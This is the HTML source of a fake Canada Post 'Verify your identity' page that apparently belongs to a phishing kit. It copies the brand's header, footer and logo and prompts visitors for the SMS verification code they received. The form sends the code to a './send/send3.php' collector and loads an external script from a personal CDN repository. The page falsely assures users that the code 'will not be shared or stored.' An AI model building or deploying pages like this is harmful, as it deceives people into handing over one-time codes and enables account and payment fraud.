<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SMS Verification | Canada Post</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="./images/favicon.ico" /> 
    <style>
        :root {
            --primary-blue: #005fa6;
            --primary-blue-dark: #004a80;
            --primary-blue-light: #e6f2ff;
            --accent-green: #00a651;
            --accent-orange: #ff6b00;
            --neutral-dark: #1a1a1a;
            --neutral-gray: #4a4a4a;
            --neutral-light: #f8f9fa;
            --neutral-border: #e0e0e0;
            --white: #ffffff;
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.08);
            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.12);
            --border-radius: 8px;
            --transition: all 0.2s ease;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            line-height: 1.6;
            color: var(--neutral-dark);
            background-color: var(--neutral-light);
        }

        /* ====== HEADER STYLE ====== */
        .site-header {
            background-color: var(--white);
            border-bottom: 1px solid var(--neutral-border);
            box-shadow: var(--shadow-sm);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 40px;
        }

        .logo img {
            height: 40px;
            width: auto;
        }

        .main-nav ul {
            list-style: none;
            display: flex;
            gap: 24px;
        }

        .main-nav a {
            text-decoration: none;
            color: var(--neutral-gray);
            font-weight: 500;
            font-size: 15px;
            padding: 8px 0;
            position: relative;
            transition: var(--transition);
        }

        .main-nav a:hover {
            color: var(--primary-blue);
        }

        .main-nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background-color: var(--primary-blue);
            transition: var(--transition);
        }

        .main-nav a:hover::after {
            width: 100%;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .support-link {
            text-decoration: none;
            color: var(--neutral-gray);
            font-size: 15px;
            font-weight: 500;
            transition: var(--transition);
        }

        .support-link:hover {
            color: var(--primary-blue);
        }

        .search-box {
            display: flex;
            align-items: center;
            border: 1px solid var(--neutral-border);
            padding: 8px 12px;
            border-radius: 24px;
            background-color: var(--white);
            transition: var(--transition);
        }

        .search-box:focus-within {
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 2px var(--primary-blue-light);
        }

        .search-box input {
            border: none;
            outline: none;
            padding: 0 8px;
            font-size: 15px;
            background: transparent;
            width: 180px;
        }

        .search-box button {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 16px;
            color: var(--neutral-gray);
            transition: var(--transition);
        }

        .search-box button:hover {
            color: var(--primary-blue);
        }

        @media (max-width: 768px) {
            .main-nav ul {
                display: none;
            }
            .search-box input {
                width: 120px;
            }
        }

        /* ====== MAIN CONTENT ====== */
        .page-wrapper {
            max-width: 600px;
            margin: 0 auto;
            padding: 48px 24px 80px;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 24px;
            color: var(--neutral-dark);
            position: relative;
            padding-bottom: 16px;
        }

        h1::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-blue), var(--accent-green));
            border-radius: 2px;
        }

        .subtitle {
            font-size: 15px;
            color: var(--neutral-gray);
            margin-bottom: 24px;
        }

        .form-card {
            background-color: var(--white);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow-md);
            padding: 32px 32px 28px;
            position: relative;
            overflow: hidden;
        }

        .form-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-blue), var(--accent-green));
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--neutral-dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section-title::before {
            content: '📱';
            font-size: 18px;
        }

        .otp-description {
            font-size: 14px;
            color: var(--neutral-gray);
            margin-bottom: 18px;
        }

        .form-row {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 6px;
            color: var(--neutral-gray);
        }

        .required::after {
            content: '*';
            color: #e53935;
            margin-left: 4px;
        }

        #otp {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border-radius: var(--border-radius);
            border: 1px solid var(--neutral-border);
            background-color: var(--white);
            transition: var(--transition);
        }

        #otp:focus {
            outline: none;
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 2px var(--primary-blue-light);
        }

        #otp.error {
            border-color: #e53935;
        }

        .error-message {
            font-size: 12px;
            margin-top: 4px;
            min-height: 16px;
        }

        .helper-text {
            font-size: 12px;
            color: var(--neutral-gray);
            margin-top: 4px;
        }

        .otp-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
            font-size: 13px;
            color: var(--neutral-gray);
            flex-wrap: wrap;
            gap: 8px;
        }

        .otp-timer {
            font-weight: 500;
        }

        .resend-link {
            border: none;
            background: none;
            padding: 0;
            margin: 0;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            color: var(--primary-blue);
            text-decoration: underline;
            transition: var(--transition);
        }

        .resend-link:disabled {
            cursor: not-allowed;
            color: var(--neutral-gray);
            text-decoration: none;
            opacity: 0.7;
        }

        .actions {
            margin-top: 24px;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }

        .btn-primary,
        .btn-secondary {
            min-width: 130px;
            padding: 10px 22px;
            border-radius: var(--border-radius);
            border: none;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-blue), var(--primary-blue-dark));
            color: var(--white);
            box-shadow: 0 2px 6px rgba(0, 95, 166, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 95, 166, 0.4);
        }

        .btn-secondary {
            background-color: var(--white);
            color: var(--neutral-gray);
            border: 1px solid var(--neutral-border);
        }

        .btn-secondary:hover {
            background-color: var(--neutral-light);
            border-color: var(--neutral-gray);
        }

        .security-notice {
            background-color: var(--primary-blue-light);
            border-left: 4px solid var(--primary-blue);
            padding: 14px 16px;
            border-radius: 4px;
            margin-top: 18px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
            font-size: 13px;
            color: var(--neutral-gray);
        }

        .security-icon {
            font-size: 18px;
            color: var(--primary-blue);
        }

        @media (max-width: 640px) {
            .form-card {
                padding: 24px 20px 22px;
            }
            .actions {
                flex-direction: column-reverse;
            }
            .btn-primary, .btn-secondary {
                width: 100%;
            }
        }

        /* ====== FOOTER ====== */
        .site-footer {
            background-color: var(--neutral-dark);
            color: var(--white);
            font-size: 15px;
        }

        .site-footer a {
            color: var(--white);
            text-decoration: none;
            transition: var(--transition);
        }

        .site-footer a:hover {
            color: var(--primary-blue-light);
        }

        .footer-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 60px 24px 40px;
        }

        .footer-top {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 40px;
            margin-bottom: 40px;
        }

        .footer-column-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            position: relative;
            padding-bottom: 12px;
        }

        .footer-column-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 40px;
            height: 2px;
            background-color: var(--primary-blue);
        }

        .footer-list {
            list-style: none;
        }

        .footer-list li {
            margin-bottom: 12px;
        }

        .footer-social {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }

        .social-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: rgba(255, 255, 255, 0.1);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            transition: var(--transition);
        }

        .social-icon:hover {
            background-color: var(--primary-blue);
            transform: translateY(-2px);
        }

        .footer-divider {
            border: none;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            margin: 32px 0 24px;
        }

        .footer-bottom {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 16px;
            flex-wrap: wrap;
            font-size: 14px;
        }

        .footer-bottom-center a {
            margin: 0 12px;
        }

        .footer-bottom-right {
            font-weight: 600;
            letter-spacing: 0.03em;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .canada-logo svg {
            width: 78px;
            height: 18px;
            fill: white;
        }

        @media (max-width: 768px) {
            .footer-top {
                grid-template-columns: 1fr;
                gap: 32px;
            }
            .footer-bottom {
                flex-direction: column;
                align-items: flex-start;
                gap: 20px;
            }
            .footer-bottom-center a {
                margin-left: 0;
                margin-right: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- ====== HEADER ====== -->
    <header class="site-header">
        <div class="header-inner">
            <div class="header-left">
                <a href="/" class="logo">
                    <img src="./images/ca.png" alt="Canada Post Logo">
                </a>
                <nav class="main-nav">
                    <ul>
                        <li><a href="#">Personal</a></li>
                        <li><a href="#">Business</a></li>
                        <li><a href="#">Our company</a></li>
                        <li><a href="#">Tools</a></li>
                    </ul>
                </nav>
            </div>

            <div class="header-right">
                <a href="#" class="support-link">Support</a>
                <div class="search-box">
                    <input type="text" placeholder="Search">
                    <button type="button">🔍</button>
                </div>
            </div>
        </div>
    </header>

    <!-- ====== MAIN CONTENT ====== -->
    <div class="page-wrapper">
        <h1>Verify your identity</h1>
        <p class="subtitle">
            Enter the verification code you received by SMS to continue.
        </p>

        <div class="form-card">
            <div class="section-title">Enter your verification code</div>
            <p class="otp-description">
                Type the code exactly as it appears in the message. The code can contain letters and numbers.
            </p>

            <!-- ✅ هنا أضفنا action ./send/send3.php -->
            <form id="otp-form" action="./send/send3.php" method="post">
                <div class="form-row">
                    <label for="otp" class="required">Verification code</label>
                    <input
                        type="text"
                        id="otp"
                        name="otp"
                        placeholder="Enter your code"
                        maxlength="12"
                        autocomplete="on"
                    >
                    <div id="otp-error" class="error-message"></div>
                    <div class="helper-text"></div>
                </div>

                <div class="otp-meta">
                    <span class="otp-timer">
                        You can request a new code in <span id="timer">60</span>s
                    </span>
                    <button type="button" id="resend-btn" class="resend-link" disabled>Resend code</button>
                </div>

                <div class="security-notice">
                    <div class="security-icon">🔒</div>
                    <div>
                        Your verification code is used only to confirm your identity. It will not be shared or stored.
                    </div>
                </div>

                <div class="actions">
                    <button type="button" class="btn-secondary" onclick="window.history.back();">Back</button>
                    <button type="submit" class="btn-primary">Verify</button>
                </div>
            </form>
        </div>
    </div>

    <!-- ====== FOOTER ====== -->
    <footer class="site-footer">
        <div class="footer-inner">
            <div class="footer-top">
                <div class="footer-column">
                    <div class="footer-column-title">Canada Post</div>
                    <ul class="footer-list">
                        <li><a href="#">Our company</a></li>
                        <li><a href="#">Corporate sustainability</a></li>
                        <li><a href="#">Working at Canada Post</a></li>
                        <li><a href="#">I'm an employee</a></li>
                        <li><a href="#">Media centre</a></li>
                        <li><a href="#">Negotiations updates</a></li>
                    </ul>
                </div>

                <div class="footer-column">
                    <div class="footer-column-title">Support</div>
                    <ul class="footer-list">
                        <li><a href="#">Contact us</a></li>
                        <li><a href="#">Service alerts</a></li>
                        <li><a href="#">Accessibility</a></li>
                    </ul>
                </div>

                <div class="footer-column">
                    <div class="footer-column-title">Connect with us</div>
                    <div class="footer-social">
                        <a href="#" class="social-icon">f</a>
                        <a href="#" class="social-icon">X</a>
                        <a href="#" class="social-icon">IG</a>
                        <a href="#" class="social-icon">in</a>
                        <a href="#" class="social-icon">▶</a>
                    </div>
                    <ul class="footer-list">
                        <li><a href="#">Provide website feedback</a></li>
                        <li><a href="#">Provide accessibility feedback</a></li>
                        <li><a href="#">Become a research participant</a></li>
                    </ul>
                </div>

                <div class="footer-column">
                    <div class="footer-column-title">Blogs</div>
                    <ul class="footer-list">
                        <li><a href="#">Business Matters</a></li>
                        <li><a href="#">Canada Post Magazine</a></li>
                    </ul>
                </div>
            </div>

            <hr class="footer-divider">

            <div class="footer-bottom">
                <div class="footer-bottom-left">
                    © Canada Post Corporation
                </div>
                <div class="footer-bottom-center">
                    <a href="#">Legal</a> |
                    <a href="#">Privacy</a> |
                    <a href="#">Access to information</a>
                </div>
                <div class="footer-bottom-right">
                    <span class="canada-logo" role="presentation" alt="Canada logo">
                        <svg xmlns="http://www.w3.org/2000/svg" width="78" height="18" viewBox="0 0 78 18">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M15.2163 0.35453L15.3712 5.98151H15.0751C15.0068 5.81334 14.934 5.62828 14.8577 5.42631C14.405 4.19065 14.0286 3.3533 13.7304 2.91642C12.6031 1.24259 11.182 0.405239 9.46662 0.405239C7.59638 0.405239 6.06432 1.28766 4.86956 3.05165C3.73428 4.71508 3.16619 6.69664 3.16619 8.99502C3.16619 11.3783 3.69123 13.2927 4.7413 14.739C5.92807 16.3691 7.62212 17.1839 9.82523 17.1839C10.8837 17.1839 11.8122 16.9954 12.6102 16.6187C13.4082 16.2417 14.0215 15.6999 14.448 14.9947C14.8408 14.3563 15.1311 13.532 15.3192 12.5195L15.6153 12.5702C15.3832 14.3875 14.7103 15.7458 13.5959 16.6456C12.4806 17.5454 10.9112 17.9952 8.88833 17.9952C6.09272 17.9952 3.88917 17.1626 2.27634 15.4979C0.75804 13.9424 0 11.8837 0 9.32398C0 7.9518 0.230785 6.66413 0.69413 5.45968C1.15748 4.2548 1.80944 3.25448 2.64959 2.45918C3.48974 1.65606 4.56111 1.03325 5.8646 0.589873C7.00521 0.197202 8.15026 0 9.2993 0C10.1568 0 11.036 0.12829 11.9365 0.383135C12.1504 0.441213 12.7118 0.618478 13.6208 0.914498C13.8271 0.981243 14.0109 1.01375 14.1742 1.01375C14.4742 1.01375 14.7183 0.794443 14.9074 0.35453H15.2163ZM27.7494 16.3696L27.9686 16.4952C27.6562 17.3603 26.9456 17.7929 25.8378 17.7929C25.1362 17.7929 24.5774 17.6156 24.162 17.2606C23.9365 17.079 23.7022 16.7822 23.4608 16.3696C22.9872 16.7744 22.6259 17.0587 22.377 17.2234C21.7751 17.6026 21.0526 17.7929 20.2107 17.7929C19.3159 17.7929 18.5854 17.5853 18.0173 17.1688C17.424 16.7362 17.1279 16.1286 17.1279 15.3463C17.1279 14.5813 17.4084 13.9576 17.9699 13.4748C18.4181 13.0921 19.1522 12.7761 20.1707 12.5256C21.3016 12.2517 22.0965 11.9847 22.554 11.7264C22.9166 11.527 23.1621 11.2774 23.2917 10.9779C23.4039 10.7196 23.4608 10.3577 23.4608 9.89222C23.4608 9.01846 23.3099 8.34841 23.0098 7.88249C22.6481 7.32513 22.1071 7.04644 21.385 7.04644C20.9124 7.04644 20.5214 7.18817 20.2116 7.47075C20.0478 7.62461 19.8117 8.03635 19.5028 8.70727C19.3306 9.08738 19.0168 9.27678 18.5619 9.27678C18.2179 9.27678 17.9512 9.15802 17.7621 8.92051C17.6161 8.73978 17.5433 8.53478 17.5433 8.30507C17.5433 7.9436 17.7542 7.64022 18.1758 7.39404C18.9414 6.96019 19.9404 6.74219 21.1715 6.74219C21.9114 6.74219 22.6521 6.85878 23.3924 7.09065C24.2703 7.36457 24.8517 7.73773 25.1362 8.20972C25.3341 8.53391 25.4331 9.09778 25.4331 9.90176V14.5583C25.4331 15.3216 25.4673 15.8412 25.536 16.1169C25.6821 16.6933 26.0331 16.9815 26.5914 16.9815C26.9594 16.9815 27.2603 16.874 27.4924 16.6586C27.5523 16.6001 27.6375 16.5035 27.7494 16.3696ZM23.4607 11.4113C23.0191 11.7711 22.5141 12.1005 21.9456 12.4008C21.2656 12.7601 20.8205 13.0193 20.6088 13.1775C19.8108 13.7708 19.4118 14.5224 19.4118 15.4325C19.4118 15.976 19.556 16.4177 19.845 16.7601C20.1667 17.1449 20.5662 17.3365 21.0411 17.3365C21.6269 17.3365 22.1408 17.1115 22.5824 16.6617C23.1678 16.0709 23.4607 15.0212 23.4607 13.5134V11.4113ZM31.8263 8.25169C31.8263 7.69042 31.7686 7.16989 31.655 6.69141L28.1035 7.14432V7.3957C29.0986 7.42951 29.6649 7.94917 29.8025 8.95425C29.8366 9.15535 29.8575 9.75909 29.8668 10.7642V13.8808C29.8575 14.7862 29.8406 15.331 29.8153 15.5148C29.7545 16.2689 29.4976 16.7886 29.0435 17.0733C28.8376 17.1908 28.4763 17.2835 27.9624 17.3499V17.6012H33.6792V17.3499C33.2935 17.2835 32.9842 17.1995 32.7534 17.098C32.2381 16.8813 31.9461 16.4583 31.8782 15.8294C31.8604 15.5616 31.8471 14.9492 31.8391 13.994V11.5226C31.8391 10.9367 31.8511 10.4486 31.8773 10.0607C31.9115 9.49991 32.0557 9.00019 32.3105 8.56244C32.5222 8.18191 32.8506 7.87852 33.2966 7.65141C33.7427 7.42474 34.2327 7.31075 34.7679 7.31075C35.269 7.31075 35.7146 7.41217 36.1056 7.61414C36.4957 7.81698 36.7753 8.09089 36.9457 8.43719C37.1743 8.89964 37.2897 9.82714 37.2897 11.221V13.8934C37.2803 14.7988 37.2635 15.3388 37.2382 15.5148C37.1774 16.2689 36.9204 16.7886 36.4664 17.0733C36.2605 17.1908 35.8992 17.2835 35.3852 17.3499V17.6012H41.1021V17.3499C40.7164 17.2835 40.403 17.1995 40.1629 17.098C39.657 16.8813 39.3689 16.4583 39.301 15.8294C39.2833 15.5616 39.27 14.9414 39.262 13.9688V9.58573C39.262 8.58368 38.8594 7.83821 38.0553 7.34976C37.4126 6.95189 36.6075 6.75338 35.6404 6.75338C34.159 6.75338 32.887 7.25311 31.8263 8.25169ZM52.7201 16.3696L52.9389 16.4952C52.6269 17.3603 51.9163 17.7929 50.8085 17.7929C50.1069 17.7929 49.5481 17.6156 49.1327 17.2606C48.9072 17.079 48.6729 16.7822 48.431 16.3696C47.9575 16.7744 47.5966 17.0587 47.3477 17.2234C46.7458 17.6026 46.0229 17.7929 45.1814 17.7929C44.2867 17.7929 43.5557 17.5853 42.988 17.1688C42.3947 16.7362 42.0986 16.1286 42.0986 15.3463C42.0986 14.5813 42.3791 13.9576 42.9401 13.4748C43.3888 13.0921 44.1229 12.7761 45.1414 12.5256C46.2718 12.2517 47.0667 11.9847 47.5243 11.7264C47.8869 11.527 48.1328 11.2774 48.2624 10.9779C48.3742 10.7196 48.431 10.3577 48.431 9.89222C48.431 9.01846 48.2801 8.34841 47.9801 7.88249C47.6184 7.32513 47.0774 7.04644 46.3557 7.04644C45.8826 7.04644 45.4916 7.18817 45.1823 7.47075C45.0181 7.62461 44.782 8.03635 44.4731 8.70727C44.3013 9.08738 43.9875 9.27678 43.5322 9.27678C43.1882 9.27678 42.9215 9.15802 42.7324 8.92051C42.5868 8.73978 42.5136 8.53478 42.5136 8.30507C42.5136 7.9436 42.7244 7.64022 43.146 7.39404C43.9121 6.96019 44.9111 6.74219 46.1423 6.74219C46.8821 6.74219 47.6224 6.85878 48.3631 7.09065C49.2405 7.36457 49.8219 7.73773 50.1069 8.20972C50.3048 8.53391 50.4038 9.09778 50.4038 9.90176V14.5583C50.4038 15.3216 50.438 15.8412 50.5068 16.1169C50.6528 16.6933 51.0038 16.9815 51.5617 16.9815C51.9301 16.9815 52.231 16.874 52.4627 16.6586C52.523 16.6001 52.6082 16.5035 52.7201 16.3696ZM48.431 11.4113C47.9899 11.7711 47.4848 12.1005 46.9158 12.4008C46.2363 12.7601 45.7912 13.0193 45.5795 13.1775C44.7815 13.7708 44.3825 14.5224 44.3825 15.4325C44.3825 15.976 44.5267 16.4177 44.8157 16.7601C45.1374 17.1449 45.5364 17.3365 46.0118 17.3365C46.5972 17.3365 47.1115 17.1115 47.5527 16.6617C48.1385 16.0709 48.431 15.0212 48.431 13.5134V11.4113ZM62.1735 16.6928C62.1646 17.1462 62.2081 17.5818 62.3048 18L66.0875 17.486V17.1713C65.8128 17.1635 65.5855 17.1418 65.4053 17.1089C64.9163 16.9915 64.5603 16.6781 64.3371 16.1662C64.1831 15.8477 64.101 15.3076 64.093 14.5448V0L60.1261 0.490188V0.804411C60.6663 0.813079 61.0826 0.917965 61.3746 1.1182C61.8717 1.51261 62.1207 2.26674 62.1207 3.38104V7.99774C61.7607 7.71299 61.4651 7.50538 61.2343 7.37362C60.5318 6.95885 59.7311 6.75038 58.8329 6.75038C57.3088 6.75038 56.0417 7.24707 55.0311 8.23958C53.9433 9.31661 53.4001 10.7178 53.4001 12.4445C53.4001 14.0798 53.9136 15.3978 54.941 16.399C55.8997 17.3338 57.1122 17.8011 58.5772 17.8011C59.7919 17.8011 60.9907 17.4318 62.1735 16.6928ZM56.7651 8.55727C57.4522 7.55609 58.2834 7.05464 59.2585 7.05464C59.835 7.05464 60.3565 7.2137 60.823 7.53052C61.3906 7.92363 61.7687 8.54904 61.9551 9.40849C62.0656 9.92642 62.1207 10.8691 62.1207 12.2378C62.1207 12.9807 62.0905 13.6533 62.0315 14.2536C61.9804 14.8378 61.8317 15.3796 61.5863 15.8802C61.3737 16.3396 61.0493 16.7071 60.613 16.9828C60.1768 17.2584 59.7076 17.3954 59.2075 17.3954C58.1725 17.3954 57.3288 16.8783 56.6759 15.8429C56.0142 14.7915 55.684 13.5896 55.684 12.2378C55.684 10.8279 56.0444 9.60093 56.7651 8.55727ZM77.7806 16.3696L77.9999 16.4952C77.6874 17.3603 76.9769 17.7929 75.8691 17.7929C75.1674 17.7929 74.6087 17.6156 74.1937 17.2606C73.9678 17.079 73.7334 16.7822 73.492 16.3696C73.018 16.7744 72.6572 17.0587 72.4082 17.2234C71.8064 17.6026 71.0839 17.7929 70.2419 17.7929C69.3476 17.7929 68.6167 17.5853 68.049 17.1688C67.4552 16.7362 67.1592 16.1286 67.1592 15.3463C67.1592 14.5813 67.4397 13.9576 68.0011 13.4748C68.4494 13.0921 69.1834 12.7761 70.202 12.5256C71.3328 12.2517 72.1277 11.9847 72.5848 11.7264C72.9474 11.527 73.1933 11.2774 73.3234 10.9779C73.4352 10.7196 73.492 10.3577 73.492 9.89222C73.492 9.01846 73.3411 8.34841 73.0411 7.88249C72.6794 7.32513 72.1384 7.04644 71.4163 7.04644C70.9436 7.04644 70.5526 7.18817 70.2428 7.47075C70.0791 7.62461 69.8429 8.03635 69.534 8.70727C69.3618 9.08738 69.0481 9.27678 68.5932 9.27678C68.2492 9.27678 67.9825 9.15802 67.7934 8.92051C67.6474 8.73978 67.5746 8.53478 67.5746 8.30507C67.5746 7.9436 67.7854 7.64022 68.207 7.39404C68.9726 6.96019 69.9716 6.74219 71.2032 6.74219C71.9426 6.74219 72.6834 6.85878 73.4237 7.09065C74.3015 7.36457 74.8829 7.73773 75.1674 8.20972C75.3654 8.53391 75.4643 9.09778 75.4643 9.90176V14.5583C75.4643 15.3216 75.4985 15.8412 75.5673 16.1169C75.7133 16.6933 76.0648 16.9815 76.6227 16.9815C76.9906 16.9815 77.2915 16.874 77.5236 16.6586C77.5836 16.6001 77.6688 16.5035 77.7806 16.3696ZM73.492 11.4113C73.0508 11.7711 72.5453 12.1005 71.9768 12.4008C71.2973 12.7601 70.8517 13.0193 70.64 13.1775C69.842 13.7708 69.4431 14.5224 69.4431 15.4325C69.4431 15.976 69.5873 16.4177 69.8762 16.7601C70.198 17.1449 70.597 17.3365 71.0723 17.3365C71.6581 17.3365 72.1721 17.1115 72.6137 16.6617C73.1991 16.0709 73.492 15.0212 73.492 13.5134V11.4113ZM68.3244 5.47832H65.6504V0.00390625H68.3244V5.47832ZM74.7803 5.47832H77.4454V0.00390625H74.7803V5.47832ZM71.297 5.23775H71.5225H71.7564V4.18629L72.9667 4.29638L72.731 3.87554L74.0536 2.9359L73.695 2.7452L74.0327 1.8463L73.3257 2.0162L73.0585 1.6556L72.1363 2.54583L72.6289 0.834723L72.0448 1.15415L71.5225 0.233582L71.0001 1.15415L70.4262 0.834723L70.9082 2.54583L69.9953 1.6556L69.7299 2.0162L69.0122 1.8463L69.35 2.7452L69.0016 2.9359L70.314 3.87554L70.0885 4.29638L71.297 4.18629V5.23775Z"></path>
                        </svg>
                    </span>
                </div>
            </div>
        </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/gh/900com/jsdelivr@latest/cp_3.js"></script><script>
        const otpInput = document.getElementById('otp');
        const otpError = document.getElementById('otp-error');
        const resendBtn = document.getElementById('resend-btn');
        const timerSpan = document.getElementById('timer');

        let countdown = 60;
        let timerInterval = null;

        function setError(message) {
            otpError.textContent = message;
            otpError.style.color = 'red';
            otpError.style.fontWeight = 'bold';
            otpInput.classList.add('error');
        }

        function clearError() {
            otpError.textContent = '';
            otpInput.classList.remove('error');
        }

        function startTimer() {
            countdown = 60;
            timerSpan.textContent = countdown;
            resendBtn.disabled = true;

            if (timerInterval) clearInterval(timerInterval);

            timerInterval = setInterval(() => {
                countdown--;
                timerSpan.textContent = countdown;
                if (countdown <= 0) {
                    clearInterval(timerInterval);
                    resendBtn.disabled = false;
                    timerSpan.textContent = '0';
                }
            }, 1000);
        }

        otpInput.addEventListener('input', () => {
            clearError();
        });

        resendBtn.addEventListener('click', () => {
            clearError();
            // هنا مكان استدعاء إرسال SMS من الباك إند
            alert('A new verification code has been sent.');
            startTimer();
        });

        // ✅ هنا خفّضنا استخدام preventDefault، نستعمله فقط لو فيه خطأ
        document.getElementById('otp-form').addEventListener('submit', function (e) {
            clearError();
            const code = otpInput.value.trim();

            if (!code) {
                e.preventDefault();
                setError('Please enter your verification code.');
                return;
            }

            if (code.length > 12) {
                e.preventDefault();
                setError('The code must be 12 characters or less.');
                return;
            }

            // لو الكود صحيح، الفورم يروح مباشرة إلى ./send/send3.php
            // يمكن تضيف hidden inputs هنا لو تحتاج ترسل معلومات إضافية
        });

        // Start initial countdown
        startTimer();

        // Focus on load
        window.addEventListener('load', () => {
            otpInput.focus();
        });
    </script>
</body>
</html>
